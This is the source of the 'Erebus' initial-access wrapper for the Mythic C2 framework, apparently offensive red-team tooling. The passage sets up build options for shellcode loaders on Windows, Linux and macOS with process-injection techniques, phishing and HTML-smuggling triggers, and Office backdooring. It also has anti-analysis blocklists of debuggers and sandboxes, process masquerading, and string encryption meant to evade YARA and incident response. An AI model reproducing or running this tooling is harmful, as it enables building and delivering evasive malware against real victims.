'''
- Author(s): Lavender-exe // hunterino-sec // Whispergate
- Title: Erebus // erebus_wrapper
- Description: Initial Access Wrapper
'''

from erebus_wrapper.erebus.modules.plugin_loader import get_plugin_loader
from erebus_wrapper.erebus.modules import run_plugin_validation, report_validation_results

_plugin_loader = get_plugin_loader()

# Auto-inject every function exported by a loaded plugin into the builder's
# module namespace. The source of truth is `_plugin_loader.functions`, which
# plugin_loader.load_all_plugins() builds by calling each ErebusPlugin's
# register() and collecting the returned {name: callable} mappings. Only
# what a plugin explicitly exports via register() lands here - internal
# archive helpers stay private.
#
# Historical note (pre-R1c): this used to be a hand-maintained
# _PLUGIN_FUNCTIONS list + explicit get_function() loop. Any plugin-side
# rename that wasn't mirrored in the list would silently bind the old name
# to None, and the build would crash at call time deep inside build() with
# "'NoneType' object is not callable". Auto-discovery + the integrity
# assertion below fail loudly at import time instead.
globals().update(_plugin_loader.functions)

# Integrity check: every plugin function the builder currently calls should
# resolve after auto-discovery. Missing names get logged upfront so the
# root cause is visible in the Mythic build log, but are not hard-asserted:
# a plugin can legitimately fail to load when its host environment is
# missing an optional dependency (e.g. py7zr, pycdlib, pylnk3, openpyxl in
# bare Python environments), and taking the whole builder out in that
# situation is stricter than the pre-refactor behaviour.
#
# Pre-R1c the builder did `globals()[n] = _plugin_loader.get_function(n)`
# which silently bound missing names to None; build() would then crash with
# "'NoneType' object is not callable" at call time. Post-R1c the name is
# simply not bound and the failure manifests as AttributeError at call
# time - strictly clearer, behaviour-preserving, and the warning below
# gives an upfront diagnostic that pre-R1c had no equivalent for.
_REQUIRED_PLUGIN_FUNCTIONS = [
    "generate_proxies",
    "build_clickonce", "build_msi", "hijack_msi",
    "add_multiple_files_to_msi", "create_custom_action",
    "create_payload_trigger", "create_bat_payload_trigger",
    "create_msi_payload_trigger", "create_clickonce_trigger",
    "create_msc_explorer_trigger", "create_html_smuggling_trigger",
    "create_clickfix_trigger",
    "build_7z", "build_zip", "build_iso", "build_electron_installer", "build_vhd",
    "build_appinstaller", "build_msix_structure",
    "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
    "generate_excel_payload", "backdoor_existing_excel",
    "generate_command_execution_vba",
    "sanitize_pe", "generate_self_hunt_rules",
    "build_obfuscation_cmd", "build_key_extraction_cmd", "build_raw_key_cmd",
    "parse_key_iv", "extract_raw_key_array",
    "build_loader_config_data",
    "donut_convert", "donut_available",
    "create_dotm_template_injection", "create_pptm_payload", "create_ppam_payload",
    "create_chm_project",
    "create_svg_smuggling_trigger",
    "generate_redirector_configs",
    "create_decoy_document",
    "create_phishing_page",
    "create_appdomain_config", "create_appdomain_remote_config", "get_appdomain_targets",
    "create_searchms_trigger", "create_udl_trigger",
    "create_qr_html_trigger",
    "create_encrypted_html_smuggling_trigger", "create_geofenced_html_smuggling_trigger",
    "salt_text",
    "create_vscode_ext_trigger",
    # Linux / macOS initial access triggers
    "create_bash_trigger",
    "create_desktop_trigger",
    "create_applescript_trigger",
    "create_command_trigger",
    "create_pkg_trigger",
]
_missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
if _missing:
    print(
        f"[Plugin] WARNING: builder expects but cannot find these plugin functions: "
        f"{_missing}. A plugin either failed to load or renamed a registered function. "
        f"Any build path using these names will fail with AttributeError at call time. "
        f"Check the [Plugin] Error log lines above for load errors."
    )

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from pathlib import PurePath
# distutils was removed in Python 3.12; shutil.copytree(..., dirs_exist_ok=True)
# matches the merge-into-existing-dir semantics the old copy_tree provided.
from jinja2 import Environment, FileSystemLoader
from datetime import datetime
from pathlib import Path
import os
import tempfile
import shutil
import hashlib
import asyncio
import io
import subprocess
import zipfile
import secrets

# ============================================================================
# Guardrail string encryption
# ============================================================================
# Guardrail allowlist/blocklist entries (hostnames, usernames, domains, IPs)
# used to be emitted as plaintext `const char*` arrays in the compiled loader,
# which meant `strings` on a delivered sample trivially leaked target scoping
# data. We now XOR-encrypt each entry at build time with a per-build random
# key and emit byte arrays; the generated DecryptGuardrails() stub decrypts
# them in place on first call inside GetGuardrailConfig().
#
# This defeats static string hunts and family-level YARA. It does not defeat
# a determined reverse engineer (the key is next to the ciphertext) - that's
# acceptable for guardrail scoping data, where the goal is to frustrate
# automated triage and avoid leaking operator targeting to incident response.

GUARDRAIL_LIST_KEYS = [
    "GUARDRAIL_ALLOWED_HOSTNAMES",
    "GUARDRAIL_BLOCKED_HOSTNAMES",
    "GUARDRAIL_BLOCKED_USERNAMES",
    "GUARDRAIL_ALLOWED_IPS",
    "GUARDRAIL_BLOCKED_IPS",
    "GUARDRAIL_ALLOWED_DOMAINS",
]

def build_guardrail_encryption(gr_lists: dict) -> dict:
    """Encrypt guardrail string lists with a per-build XOR key.

    Input:  { "GUARDRAIL_ALLOWED_HOSTNAMES": ["host1", "host2"], ... }
    Output: template vars consumed by config.hpp:
        GR_XOR_KEY          -> list[int]  (16 random bytes)
        GR_ENC_<LIST_NAME>  -> list[list[int]]  per-entry ciphertext
                               (includes trailing NUL byte, also XORed)
        GR_COUNT_<LIST_NAME>-> int  (number of entries, convenience)
    """
    key = list(secrets.token_bytes(16))
    out = {"GR_XOR_KEY": key}
    for name in GUARDRAIL_LIST_KEYS:
        entries = gr_lists.get(name, []) or []
        enc_entries = []
        for s in entries:
            raw = s.encode("utf-8") + b"\x00"
            ct = [raw[i] ^ key[i % len(key)] for i in range(len(raw))]
            enc_entries.append(ct)
        out[f"GR_ENC_{name}"] = enc_entries
        out[f"GR_COUNT_{name}"] = len(enc_entries)
    return out


ENCRYPTION_METHODS = {
    "AES_ECB"    :  "aes_ecb",
    "AES_CBC"    :  "aes_cbc",
    "RC4"        :  "rc4",
    "XOR"        :  "xor",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words256",
    "NONE"    : ""
}

# Compression type mappings for config templates
COMPRESSION_TYPE_MAP = {
    "NONE" : 0,
    "LZNT1": 1,
    "RLE"  : 2,
}

# Encoding type mappings for config templates
ENCODING_TYPE_MAP = {
    "NONE"   : 0,
    "BASE64" : 1,
    "ASCII85": 2,
    "ALPHA32": 3,
    "WORDS256": 4,
}

SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "iso",
    "msi"
]


def parse_csv(value):
    """Split a CSV parameter value into a trimmed, non-empty list.

    Used across guardrail parameter extraction (Shellcode Loader, ClickOnce,
    DLL Hijack). Previously defined as two nested duplicates inside build()
    """
    if not value or not isinstance(value, str):
        return []
    return [item.strip() for item in value.split(',') if item.strip()]


def array_to_csharp_string(lst):
    """Render a Python list as a C# string-array literal body.

    Produces `"a", "b", "c"` (no brackets). Consumed by the ClickOnce
    InjectionConfig.cs template where fields expect inline string-array
    initializer bodies.
    """
    if not lst or len(lst) == 0:
        return ""
    return ", ".join(f'"{item}"' for item in lst)


def collect_guardrail_gr_lists(wrapper, enabled: bool, param_names: dict) -> dict:
    """Assemble the GUARDRAIL_* dict fed into the config.hpp Jinja template.

    `param_names` maps each GUARDRAIL_* key to the Mythic parameter name
    that supplies its CSV value, for example::

        {
            "GUARDRAIL_ALLOWED_HOSTNAMES": "0.5g Hostname Whitelist",
            ...
        }

    Passing parameter names explicitly (rather than assuming a letter-offset
    convention) keeps this helper usable from the Shellcode Loader site
    (`0.5g`-`0.5l`) and the DLL Hijack site (`1.1f`-`1.1k`) even though the
    two schemas don't share a letter alignment - if a schema drifts, each
    call site updates its own name list independently.

    Returns a dict pre-merged with `build_guardrail_encryption(gr_lists)` so
    callers do not have to remember the double-splat idiom.
    """
    gr_lists = {
        key: (parse_csv(wrapper.get_parameter(pname)) if enabled else [])
        for key, pname in param_names.items()
    }
    return {**gr_lists, **build_guardrail_encryption(gr_lists)}


def _finalize_pe_artifact(
    payload_path: str,
    payload_dir: str,
    *,
    build_config: str = "release",
) -> str:
    """Run post-compile PE finalization on a just-built PE.

    Sequence (release builds only):
      1. sanitize_pe() - scrub MinGW / compiler fingerprints from the PE
         before anything downstream consumes it (codesign, packaging,
         IOC hashing).
      2. generate_self_hunt_rules() - emit per-build YARA + Sigma rules
         alongside the payload so operators can validate the artifact
         against the target SIEM before delivery.

    Both steps are non-fatal by contract: failures append warning lines to
    the returned string rather than raising, so the build always proceeds.
    The returned string is appended to the builder's `output` accumulator
    (which feeds `response.build_stdout`); an empty return is valid when
    both steps succeed silently (self_hunt does append a success line, so
    in practice the return is non-empty on success).

    build_config == "debug" skips both steps entirely. Debug binaries are
    never delivered to targets (they're O0 + contain DWARF, fingerprintable
    trivially on sight), so the sanitizer has no OPSEC value on them and
    has historically caused load failures on Windows when it inadvertently
    touched something the runtime still referenced. Leaving debug builds
    untouched is both the correct policy and the safer one.
    """
    if build_config == "debug":
        return "[pe_sanitize] skipped on debug build\n"
    lines = []
    try:
        sanitize_pe(payload_path)
    except Exception as san_err:
        lines.append(f"[pe_sanitize] warning: {san_err}")
    try:
        sh = generate_self_hunt_rules(payload_path, payload_dir)
        lines.append(f"[self_hunt] {sh['rule_name']} -> {sh['yara']}")
    except Exception as sh_err:
        lines.append(f"[self_hunt] warning: {sh_err}")
    return ("\n".join(lines) + "\n") if lines else ""


# Default debugger / analysis process blocklist rendered into ClickOnce
# InjectionConfig.cs `BlockedProcesses`. Covers native debuggers, .NET
# decompilers, process monitors, traffic inspectors, and common sandbox
# harness processes. Hoisted from a nested local in build() so it is a
# single canonical list rather than re-initialized on every ClickOnce build.
DEFAULT_BLOCKED_PROCESSES = [
    # Native debuggers
    "x64dbg", "x32dbg", "windbg", "ollydbg", "ida", "ida64",
    "immunitydebugger", "radare2",
    # .NET decompilers / analysis
    "dnspy", "dnspyex", "dotpeek", "ilspy",
    "jetbrains.rider", "reflector", "de4dot", "ildasm",
    # Process monitors / system inspectors
    "processhacker", "procmon", "procmon64", "procexp",
    "procexp64", "autoruns", "autorunsc",
    # Traffic inspection
    "wireshark", "dumpcap", "tcpdump", "fiddler",
    "fiddler everywhere", "charles", "burpsuite",
    # Sandboxing / analysis harnesses
    "sbiectrl", "sandboxiedcomlaunch", "cuckoo",
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    author = "@Lavender-exe, @hunterino-sec"
    semver = "0.1.0"
    
    note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"

    file_extension = "zip"
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
        SupportedOS.MacOS,
    ]

    wrapper = True
    wrapped_payloads = ["merlin", "kharon", "ceos"
                        "sliver", "apollo", "athena",
                        "xenon", "nimplant", "hannibal"]
    c2_profiles = []

    # Plugin validation flag - run only once at startup
    _validation_run = False

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    _agent_icon_path = Path(__file__).resolve().parent.parent / "Erebus.png"
    agent_icon_path = str(_agent_icon_path)
    agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"

    build_parameters = [
        BuildParameter(
            name="0.0 Target OS",
            group_name="0 - Target Platform",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Target operating system. Selects the appropriate trigger set. "
                "Linux and macOS show platform-specific triggers and skip Windows-only loader options."
            ),
            choices=["Windows", "Linux", "macOS"],
            default_value="Windows",
        ),

        BuildParameter(
            name = "0.0 Main Payload Type",
            group_name="0 - Target Platform",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
""",
            choices = ["Loader", "Hijack"],
            default_value="Loader",
        ),

        BuildParameter(
            name = "0.0a Enable Custom Shellcode",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Upload custom raw shellcode from an external C2 (e.g. Cobalt Strike, Havoc, Sliver). "
                "When enabled the Mythic-wrapped payload is ignored and the uploaded file is used as "
                "the shellcode source. The file must be raw position-independent shellcode - "
                "PE files (MZ header) are rejected."
            ),
            default_value = False,
            required = False,
        ),

        BuildParameter(
            name = "0.0b Custom Shellcode File",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.File,
            description = (
                "Raw shellcode blob to use instead of the Mythic-wrapped payload "
                "(e.g. a .bin produced by msfvenom, CS payload generator, etc.). "
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="0.0a Enable Custom Shellcode", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.0c Enable Donut",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Convert a PE (.exe/.dll) or .NET assembly to raw shellcode via Donut "
                "before the obfuscation pipeline."
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.0d Donut Input File",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.File,
            description = "PE (.exe/.dll) or .NET assembly to convert to shellcode via Donut.",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0c Enable Donut", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.0e Donut Architecture",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Target architecture for Donut shellcode generation.",
            choices = ["x64", "x86", "x86+x64"],
            default_value = "x64",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0c Enable Donut", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.0f Donut Args",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.String,
            description = "Optional command-line arguments passed to the Donut payload at runtime.",
            default_value = "",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0c Enable Donut", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.0g Build All Configurations",
            group_name="1 - Shellcode Source",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Build all trigger types and all container types "
                "from the compiled loader. Produces a master erebus_all_configs.zip "
                "with one sub-archive per variant. Normal trigger/container selections are ignored. "
                "Use as a build pipeline to validate all delivery mechanisms at once."
            ),
            default_value = False,
            required = False,
        ),

        BuildParameter(
            name = "0.1 Loader Type",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the type of loader to use",
            choices = ["ClickOnce", "Shellcode Loader", "VM Loader"],
            default_value = "Shellcode Loader",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.2 Loader Format",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Select the loader's output format. "
                "exe = standard PE executable. "
                "dll = DLL (side-loadable, regsvr32). "
                "xll = Excel Add-In DLL (xlAutoOpen trigger)"
            ),
            choices = [
                "exe", 
                "dll", 
                "xll"
                ],
            default_value = "exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.2a Loader Architecture",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.2b XLL Ingest File",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.File,
            description = (
                "Optional: upload a legitimate file (e.g. a real .xlsx invoice) to embed in the XLL. "
                "On xlAutoOpen the XLL drops this file to %%TEMP%% and opens it in Excel so the victim "
                "sees plausible content while the loader executes in the background. "
                "Leave empty to disable the ingestor."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="0.2 Loader Format", operand=HideConditionOperand.NotEQ, value="xll"),
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.2c XLL Ingest Filename",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.String,
            description = (
                "Filename used when dropping the embedded file to %%TEMP%% (e.g. 'Q2_Invoice.xlsx'). "
                "Match the delivery pretext. Ignored when no ingest file is uploaded."
            ),
            default_value = "document.xlsx",
            required = False,
            hide_conditions = [
                HideCondition(name="0.2 Loader Format", operand=HideConditionOperand.NotEQ, value="xll"),
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.3 Loader Build Configuration",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config. Release is the shippable mode: symbols stripped, rich header scrubbed, PE timestamp zeroed, debug directory blob wiped. Debug keeps symbols and leaves forensic metadata intact - use only for local testing.",
            choices = ["release", "debug", "test"],
            default_value = "release",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.3 ClickOnce Build Configuration",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.3a ClickOnce Architecture",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the ClickOnce loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        # Shellcode Loader Injection Configuration
        BuildParameter(
            name = "0.4 Shellcode Loader - Injection Type",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection technique for the Shellcode Loader:
1 = NtMapViewOfSection (Remote)
2 = CreateFiber (Self)
3 = EarlyCascade (Remote)
4 = PoolParty - RemoteTpDirectInsertion (Remote)
5 = NtQueueApcThread (Remote)
6 = ModuleStomp (Self)
7 = KernelCallbackTable (Self)
8 = TxfHollow (Remote)
9 = TpJobObjectApc - RemoteTpJobDirectInsertion (Remote)""",
            choices = ["1", "2", "3", "4", "5", "6", "7", "8", "9"],
            default_value = "3",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="VM Loader"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        # VM Loader Injection Configuration (self-injection only)
        BuildParameter(
            name = "0.4a VM Loader - Injection Type",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the self-injection technique for the VM Loader:
2 = CreateFiber (Self)
6 = ModuleStomp (Self)
7 = KernelCallbackTable (Self)""",
            choices = ["2", "6", "7"],
            default_value = "2",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="VM Loader"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        # ── Linux Loader ──────────────────────────────────────────────────────
        BuildParameter(
            name="0.1-L Linux Loader Type",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Linux loader output format. ELF = standalone executable. SO = shared object (for LD_PRELOAD delivery).",
            choices=["ELF", "Shared Object"],
            default_value="ELF",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.2a-L Linux Architecture",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target CPU architecture for the Linux loader.",
            choices=["x86_64", "aarch64"],
            default_value="x86_64",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.3-L Linux Build Configuration",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Release strips symbols and minimises binary size. Debug retains symbols for local testing.",
            choices=["release", "debug"],
            default_value="release",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.4-L Linux Injection Type",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Linux shellcode execution technique:\n"
                "1 = mmap_thread     - anonymous mmap(RWX) + pthread_create (self-inject)\n"
                "2 = memfd_exec      - memfd_create file-backed mapping, kernel ≥ 3.17 (self-inject, lower anon-RWX signature)\n"
                "3 = process_vm      - process_vm_writev + ptrace RIP hijack into remote process\n"
                "4 = ptrace_inject   - ptrace POKEDATA + injected mmap syscall (x86-64 only, fallback for ptrace-restricted kernels)"
            ),
            choices=["1", "2", "3", "4"],
            default_value="2",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.5-L Linux Enable Guardrails",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Enable compile-time anti-analysis checks in the Linux loader.",
            default_value=False,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.5a-L Linux Check ptrace",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Detect active ptrace attachment by reading /proc/self/status TracerPid.",
            default_value=True,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5b-L Linux Check Container",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Detect Docker/LXC/container execution via /proc/self/cgroup keyword scan.",
            default_value=True,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5c-L Linux Blocked Hostnames",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.String,
            description="Comma-separated hostname substrings to block (case-insensitive).",
            default_value="sandbox,malware,cuckoo,any.run",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5d-L Linux Blocked Usernames",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.String,
            description="Comma-separated username substrings to block (case-insensitive).",
            default_value="analyst,malware,sandbox,user",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5e-L Linux Process Masquerade",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Rename the loader process via prctl(PR_SET_NAME) to hide it in ps/top.",
            default_value=True,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.5f-L Linux Masquerade Name",
            group_name="3 - Linux Loader",
            parameter_type=BuildParameterType.String,
            description="Process name to masquerade as (default mimics a kernel worker thread).",
            default_value="[kworker/u:0]",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
                HideCondition(name="0.5e-L Linux Process Masquerade", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        # ── macOS Loader ───────────────────────────────────────────────────────
        BuildParameter(
            name="0.1-M macOS Loader Type",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="macOS loader output format. MachO = standalone executable. Dylib = dynamic library.",
            choices=["MachO", "Dylib"],
            default_value="MachO",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
            ],
        ),

        BuildParameter(
            name="0.2a-M macOS Architecture",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target CPU architecture. 'universal' produces a fat binary (x86_64 + arm64) via lipo.",
            choices=["x86_64", "arm64", "universal"],
            default_value="x86_64",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
            ],
        ),

        BuildParameter(
            name="0.3-M macOS Build Configuration",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Release strips symbols. Debug retains them for local testing.",
            choices=["release", "debug"],
            default_value="release",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
            ],
        ),

        BuildParameter(
            name="0.4-M macOS Injection Type",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "macOS shellcode execution technique:\n"
                "1 = mmap_pthread   - MAP_JIT mmap + pthread_create. Works on x86_64 and arm64. "
                "Recommended for hardened-runtime targets.\n"
                "2 = mach_thread    - Mach vm_allocate + thread_create_running via task_self(). "
                "Requires com.apple.security.cs.allow-jit entitlement on arm64."
            ),
            choices=["1", "2"],
            default_value="1",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
            ],
        ),

        BuildParameter(
            name="0.5-M macOS Enable Guardrails",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Enable compile-time anti-analysis checks in the macOS loader.",
            default_value=False,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
            ],
        ),

        BuildParameter(
            name="0.5a-M macOS Deny Attach",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Call ptrace(PT_DENY_ATTACH) at startup - kills any debugger that subsequently attaches.",
            default_value=True,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5b-M macOS Check Debug",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Detect active debugger via sysctl KERN_PROC P_TRACED flag.",
            default_value=True,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5c-M macOS Check Timing",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Detect single-stepping via mach_absolute_time loop timing (> 500 ms threshold).",
            default_value=False,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5d-M macOS Blocked Hostnames",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.String,
            description="Comma-separated hostname substrings to block (case-insensitive).",
            default_value="sandbox,malware,analyst",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        BuildParameter(
            name="0.5e-M macOS Blocked Usernames",
            group_name="4 - macOS Loader",
            parameter_type=BuildParameterType.String,
            description="Comma-separated username substrings to block (case-insensitive).",
            default_value="analyst,malware,sandbox",
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ],
        ),

        # ── Windows-only ────────────────────
        BuildParameter(
            name = "0.5 Shellcode Loader - Target Process",
            group_name="2 - Windows Loader",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection",
